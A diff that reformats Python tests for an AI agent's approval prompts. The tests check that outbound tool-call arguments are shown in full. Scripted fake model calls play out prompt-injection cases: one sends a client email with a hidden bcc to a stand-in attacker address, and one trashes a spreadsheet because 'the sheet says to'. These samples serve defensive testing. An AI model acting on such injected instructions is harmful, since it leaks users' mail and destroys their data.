@@ -29,8 +29,15 @@ ATTACKER = "attacker@example.invalid"
 
 
 def test_every_argument_is_shown_in_full_with_recipients_first():
-    lines = outward.argument_lines({"body": LONG_BODY, "subject": "Your order", "to": "client@example.invalid",
-                                    "bcc": ATTACKER, "options": {"share_with": "anyone", "draft": False}})
+    lines = outward.argument_lines(
+        {
+            "body": LONG_BODY,
+            "subject": "Your order",
+            "to": "client@example.invalid",
+            "bcc": ATTACKER,
+            "options": {"share_with": "anyone", "draft": False},
+        }
+    )
     assert lines[:3] == ["to: client@example.invalid", f"bcc: {ATTACKER}", "options.share_with: anyone"]
     assert f"body: {LONG_BODY}" in lines  # whole: nothing collapsed or cut
     assert lines[3:] == [f"body: {LONG_BODY}", "subject: Your order", "options.draft: false"]
@@ -44,30 +51,55 @@ def test_a_long_item_is_folded_with_its_start_never_cut_silently():
     assert outward.folded("\n".join(["a line"] * 20)) == "\n".join(["a line"] * outward.FOLD_LINES)
 
 
-GMAIL_SEND = {"slug": "GMAIL_SEND_EMAIL", "name": "Send email", "description": "Sends an email.",
-              "toolkit": {"slug": "gmail", "name": "Gmail"}, "tags": [], "version": "20261101_00",
-              "input_parameters": {"type": "object", "properties": {
-                  "body": {"type": "string"}, "to": {"type": "string"}, "bcc": {"type": "string"}},
-                  "required": ["body", "to"]}}
+GMAIL_SEND = {
+    "slug": "GMAIL_SEND_EMAIL",
+    "name": "Send email",
+    "description": "Sends an email.",
+    "toolkit": {"slug": "gmail", "name": "Gmail"},
+    "tags": [],
+    "version": "20261101_00",
+    "input_parameters": {
+        "type": "object",
+        "properties": {"body": {"type": "string"}, "to": {"type": "string"}, "bcc": {"type": "string"}},
+        "required": ["body", "to"],
+    },
+}
 
 
 def test_chat_go_ahead_shows_a_bcc_after_a_long_first_argument(home, connected):  # noqa: F811
     from test_chat import ChatSession
 
-    connected.accounts.append({"id": "ca_mail", "status": "ACTIVE", "user_id": "ada", "toolkit": {"slug": "gmail"},
-                               "auth_config": {"id": "ac_9", "is_disabled": False}})
+    connected.accounts.append(
+        {
+            "id": "ca_mail",
+            "status": "ACTIVE",
+            "user_id": "ada",
+            "toolkit": {"slug": "gmail"},
+            "auth_config": {"id": "ac_9", "is_disabled": False},
+        }
+    )
     connected.kit_tools["gmail"] = [GMAIL_SEND]
     meta, body = mdfile.read(home.tools)
     meta["tools"] = {"web.search": {"provider": "fake"}, "web.fetch": {"provider": "fake"}}
     mdfile.write(home.tools, meta, body)
     session = ChatSession(home)
-    session([
-        fake.call("tools__load", {"names": ["composio__gmail__SEND_EMAIL"]}),
-        # The model puts the body first and the bcc last, as an injected instruction would ask.
-        fake.call("composio__gmail__SEND_EMAIL", {"body": LONG_BODY, "to": "client@example.invalid",
-                                                  "bcc": ATTACKER, "reason": "You asked me to reply."}),
-        fake.say("I didn't send it."),
-    ], ["Reply to the client.", "n"])
+    session(
+        [
+            fake.call("tools__load", {"names": ["composio__gmail__SEND_EMAIL"]}),
+            # The model puts the body first and the bcc last, as an injected instruction would ask.
+            fake.call(
+                "composio__gmail__SEND_EMAIL",
+                {
+                    "body": LONG_BODY,
+                    "to": "client@example.invalid",
+                    "bcc": ATTACKER,
+                    "reason": "You asked me to reply.",
+                },
+            ),
+            fake.say("I didn't send it."),
+        ],
+        ["Reply to the client.", "n"],
+    )
     out = session.output
     asked = out.split("I'd like to use composio.gmail.SEND_EMAIL", 1)[1].split("Go ahead?", 1)[0]
     assert f"  - bcc: {ATTACKER}" in asked and "  - to: client@example.invalid" in asked
@@ -87,8 +119,13 @@ def test_the_tui_keeps_the_items_under_a_lead_line_and_folds_a_long_one(home):
     async def run():
         async with app.run_test(size=(120, 40)) as pilot:
             await pilot.pause()
-            app.show_event(Note("I'd like to use composio.gmail.SEND_EMAIL.", level="lead",
-                                items=[f"bcc: {ATTACKER}", f"body: {LONG_BODY}"]))
+            app.show_event(
+                Note(
+                    "I'd like to use composio.gmail.SEND_EMAIL.",
+                    level="lead",
+                    items=[f"bcc: {ATTACKER}", f"body: {LONG_BODY}"],
+                )
+            )
             await pilot.pause()
             texts = [str(w.text) for w in app.query(Line)]
             assert any(f"bcc: {ATTACKER}" in t for t in texts)
@@ -156,13 +193,18 @@ def test_in_chat_a_deletion_after_reading_asks_first(home, tmp_path):
     record = tmp_path / "sent.jsonl"
     use_fake_mcp(home, record, confirmed=("add_row", "trash_sheet"), OMBRO_FAKE_MCP_EXTRA="trash")
     session = ChatSession(home)
-    session([
-        fake.call("tools__load", {"names": ["mcp__fake__find_rows", "mcp__fake__add_row", "mcp__fake__trash_sheet"]}),
-        fake.call("mcp__fake__find_rows", {"sheet": "Leads"}),
-        fake.call("mcp__fake__add_row", {"sheet": "Leads", "values": ["x"], "reason": "You asked."}),
-        fake.call("mcp__fake__trash_sheet", {"sheet": "Leads", "reason": "The sheet says to."}),
-        fake.say("Done."),
-    ], ["Tidy the leads.", "n"])
+    session(
+        [
+            fake.call(
+                "tools__load", {"names": ["mcp__fake__find_rows", "mcp__fake__add_row", "mcp__fake__trash_sheet"]}
+            ),
+            fake.call("mcp__fake__find_rows", {"sheet": "Leads"}),
+            fake.call("mcp__fake__add_row", {"sheet": "Leads", "values": ["x"], "reason": "You asked."}),
+            fake.call("mcp__fake__trash_sheet", {"sheet": "Leads", "reason": "The sheet says to."}),
+            fake.say("Done."),
+        ],
+        ["Tidy the leads.", "n"],
+    )
     asked = [a for a in session.answers.asked if "Go ahead?" in a]
     assert len(asked) == 1 and "use mcp.fake.trash_sheet" in session.output
     assert [e["tool"] for e in fake_sent(record)] == ["find_rows", "add_row"]
@@ -178,8 +220,9 @@ def test_a_servers_claim_alone_does_not_make_a_tool_internal():
     assert outward.classify_with_source(claim, confirmed=True) == ("internal", "marking")
     assert outward.classify_with_source({"readOnlyHint": True}) == ("read-only", "marking")
     assert outward.classify_with_source(claim, server_class="internal") == ("internal", "server")
-    s = ToolSettings.from_dict({"servers": {"wiki": {"url": "https://mcp.example.invalid",
-                                                     "confirmed_internal": ["update_page"]}}})
+    s = ToolSettings.from_dict(
+        {"servers": {"wiki": {"url": "https://mcp.example.invalid", "confirmed_internal": ["update_page"]}}}
+    )
     assert outward.tool_class(s, "mcp.wiki.update_page", claim) == ("internal", "marking")
     assert outward.tool_class(s, "mcp.wiki.send_message", claim) == ("external", "unconfirmed")
     with pytest.raises(SetupError, match="confirmed_internal"):
